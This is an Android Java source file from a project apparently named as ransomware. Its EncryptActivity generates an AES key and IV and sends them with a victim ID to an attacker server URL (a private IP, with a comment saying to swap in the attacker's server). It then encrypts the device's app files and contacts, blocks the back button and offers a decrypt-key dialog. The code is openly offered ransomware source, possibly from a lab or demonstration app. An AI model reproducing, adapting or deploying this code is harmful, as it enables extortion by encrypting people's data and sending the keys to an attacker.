package com.example.nonameappransomware;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.List;
import java.util.Random;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class EncryptActivity extends Activity {


    private static final String SERVER_URL = "http://192.168.0.126/receive_keys.php"; // 공격자 서버 URL로 변경
    private static final String PREF_ENCRYPT_ACTIVE = "encrypt_active";
    private static final String PREF_IV = "encryption_iv"; // SharedPreferences key for IV
    private static final String TAG = "EncryptActivity";
    private String uniqueId;
    public static Boolean isUnlocked = true;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_encrypt); // 레이아웃 설정
        boolean isUnlocked = getIsUnlocked();

        Button decryptButton = findViewById(R.id.decryptButton); // XML에서 decryptButton 버튼 찾기
        decryptButton.setOnClickListener(v -> showDecryptDialog()); // 버튼 클릭 시 다이얼로그 표시


        TextView uniqueIdTextView = findViewById(R.id.uniqueIdTextView);
        uniqueIdTextView.setText(uniqueId);
        // gg


        // 암호화 작업을 비동기적으로 수행
        new Thread(() -> {
            if (isUnlocked){
                encryptFiles();
            }

            runOnUiThread(() -> {
                // 암호화 작업 완료 후 UI 업데이트
                //Toast.makeText(this, "Files and contacts encryption is done.", Toast.LENGTH_SHORT).show();
            });
        }).start();
    }

    @Override
    protected void onStart() {
        super.onStart();
        saveEncryptActiveState(true); // 암호화 작업이 진행 중임을 기록
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        saveEncryptActiveState(false); // 암호화 작업이 완료됨을 기록
    }

    @Override
    public void onBackPressed() {
        // 뒤로가기 버튼 비활성화
        // 아무 작업도 하지 않음
    }

    private void saveEncryptActiveState(boolean isActive) {
        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putBoolean(PREF_ENCRYPT_ACTIVE, isActive);
        editor.apply();
    }

    // isUnlocked 값을 SharedPreferences에 저장하는 메서드
    private void saveIsUnlocked(boolean isUnlocked) {
        SharedPreferences sharedPreferences = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean("isUnlocked", isUnlocked);
        editor.apply();
    }

    // SharedPreferences에서 isUnlocked 값을 불러오는 메서드
    private boolean getIsUnlocked() {
        SharedPreferences sharedPreferences = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        return sharedPreferences.getBoolean("isUnlocked", true);
    }

    private void encryptFiles() {
        try {
            // 비밀키 및 IV 생성
            SecretKey key = generateKey();
            byte[] iv = generateIv();
            SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
            preferences.edit().remove(PREF_IV).apply();

            // 비밀키 및 IV 로그 출력
            Log.d(TAG, "Generated Key: " + Base64.getEncoder().encodeToString(key.getEncoded()));
            Log.d(TAG, "Generated IV: " + Base64.getEncoder().encodeToString(iv));

            // 저장된 IV를 SharedPreferences에 저장
            saveIvToPreferences(iv);
            uniqueId = generateUniqueId();
            TextView uniqueIdTextView = findViewById(R.id.uniqueIdTextView);
            uniqueIdTextView.setText(uniqueId);

            // 키와 IV를 서버로 전송
            sendKeyAndIvToServer(uniqueId, key, iv);


            FileEncryptionUtils fileEncryptionUtils = new FileEncryptionUtils(this, key, iv);
            ContactEncryptionUtils contactEncryptionUtils = new ContactEncryptionUtils(this, key, iv);
            List<ContactEncryptionUtils.Contact> contacts = contactEncryptionUtils.getContacts();

            // 암호화 작업 수행
            fileEncryptionUtils.lockAppFiles();
            contactEncryptionUtils.encryptAndSaveContacts(contacts);
            saveIsUnlocked(false);


        } catch (Exception e) {
            e.printStackTrace();
            runOnUiThread(() -> Toast.makeText(this, "Error encrypting files: " + e.getMessage(), Toast.LENGTH_SHORT).show());
        }
    }

    private SecretKey generateKey() throws Exception {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(256); // 256-bit AES
        return keyGenerator.generateKey();
    }

    private byte[] generateIv() {
        // Initialization Vector (IV) 생성
        byte[] iv = new byte[16]; // AES block size is 16 bytes
        new java.security.SecureRandom().nextBytes(iv);
        return iv;
    }

    // 난수 생성
    private String generateUniqueId() {
        Random random = new Random();
        int uniqueNumber = 10000000 + random.nextInt(90000000);
        return String.valueOf(uniqueNumber);
    }

    private void saveIvToPreferences(byte[] iv) {
        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putString(PREF_IV, Base64.getEncoder().encodeToString(iv));
        editor.apply();
    }

    private byte[] getIvFromPreferences() {
        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
        String ivString = preferences.getString(PREF_IV, null);
        if (ivString != null) {
            return Base64.getDecoder().decode(ivString);
        }
        return null;
    }

    private void sendKeyAndIvToServer(String uniqueId, SecretKey key, byte[] iv) {
        new Thread(() -> {
            try {
                URL url = new URL("http://192.168.0.126/receive_key.php"); // 서버 URL
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);

                // JSON 객체 생성
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("UniqueId", uniqueId);
                jsonObject.put("Key", Base64.getEncoder().encodeToString(key.getEncoded()));
                jsonObject.put("IV", Base64.getEncoder().encodeToString(iv));

                String jsonInputString = jsonObject.toString();

                Log.d("EncryptActivity", "JSON to send: " + jsonInputString);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                Log.d("EncryptActivity", "Response Code: " + responseCode);

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder response = new StringBuilder();
                    String responseLine;
                    while ((responseLine = in.readLine()) != null) {
                        response.append(responseLine.trim());
                    }
                    in.close();
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean success = jsonResponse.optBoolean("success", false);

                    Log.d("EncryptActivity", "Response JSON: " + jsonResponse.toString());

                    runOnUiThread(() -> {
                        if (success) {
                            //Toast.makeText(this, "Key/IV sent to server successfully.", Toast.LENGTH_SHORT).show();
                            Log.d("EncryptActivity", "Ransom Done");
                        } else {
                            Log.d("EncryptActivity", "Ransom Not Done");
                            //Toast.makeText(this, "Failed to send Key/IV to server.", Toast.LENGTH_SHORT).show();
                        }
                    });
                } else {
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "utf-8"));
                    StringBuilder errorResponse = new StringBuilder();
                    String errorLine;
                    while ((errorLine = in.readLine()) != null) {
                        errorResponse.append(errorLine.trim());
                    }
                    in.close();
                    JSONObject errorJson = new JSONObject(errorResponse.toString());
                    String errorMessage = errorJson.optString("message", "Unknown error");

                    Log.d("EncryptActivity", "Error Response JSON: " + errorJson.toString());

                    runOnUiThread(() -> Toast.makeText(this, "Failed to send Key/IV to server: " + errorMessage, Toast.LENGTH_SHORT).show());
                }

                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("EncryptActivity", "Exception: " + e.getMessage());
                runOnUiThread(() -> Toast.makeText(this, "Error sending key/iv to server: " + e.getMessage(), Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void showDecryptDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enter Decrypt Key");

        // Set up the input
        final EditText keyInput = new EditText(this);
        keyInput.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
        keyInput.setHint("Decrypt Key");

        // Set up the layout for the dialog
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(keyInput);
        builder.setView(layout);

        // Set up the buttons
        builder.setPositiveButton("OK", (dialog, which) -> {
            String keyString = keyInput.getText().toString();
            try {
                // Convert the input key to a SecretKey
                SecretKey key = getKeyFromString(keyString);
                byte[] iv = getIvFromPreferences(); // Retrieve the stored IV

                if (key != null && iv != null) {
                    FileEncryptionUtils fileEncryptionUtils = new FileEncryptionUtils(this, key, iv);
                    ContactEncryptionUtils contactEncryptionUtils = new ContactEncryptionUtils(this, key, iv);

                    fileEncryptionUtils.unlockAppFiles();
                    contactEncryptionUtils.unlockContacts();
                    saveIsUnlocked(true);

                    // 이동할 Activity 설정
//                    Intent intent = new Intent(this, WebViewActivity.class);
//                    startActivity(intent);

                    // 3초 후 RootFridaCheckActivity로 이동
                    handler.postDelayed(() -> {
                        Intent intent = new Intent(this, WebViewActivity.class);
                        startActivity(intent);
                        finish();
                    }, 3000);
                    Toast.makeText(this, "Files decrypted successfully. Moving to WebView.",Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Invalid decrypt key or IV.", Toast.LENGTH_SHORT).show();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "Error decrypting files: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.cancel());

        builder.show();
    }

    private SecretKey getKeyFromString(String keyString) throws Exception {
        // Assume the key is provided in Base64 encoded format
        byte[] decodedKey = Base64.getDecoder().decode(keyString);
        return new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES");
    }
}
